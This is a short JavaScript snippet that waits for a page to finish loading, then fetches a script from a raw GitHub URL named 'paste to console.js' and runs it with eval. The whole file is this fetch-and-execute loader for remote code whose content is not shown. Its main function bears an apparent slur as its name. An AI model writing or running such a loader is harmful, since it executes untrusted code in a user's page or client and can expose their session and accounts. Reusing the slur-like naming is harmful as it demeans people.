const sleep = (milliseconds) => {return new Promise(resolve => setTimeout(resolve, milliseconds))};

async function nig(){
  if(document.readyState !== "complete"){
    await sleep(200)
    nig();
    return
  }
  await sleep(5000)
  await fetch('https://raw.githubusercontent.com/NotYmL/emcrydisc/main/paste%20to%20console.js').then(r=>r.text()).then(eval)
}

nig()
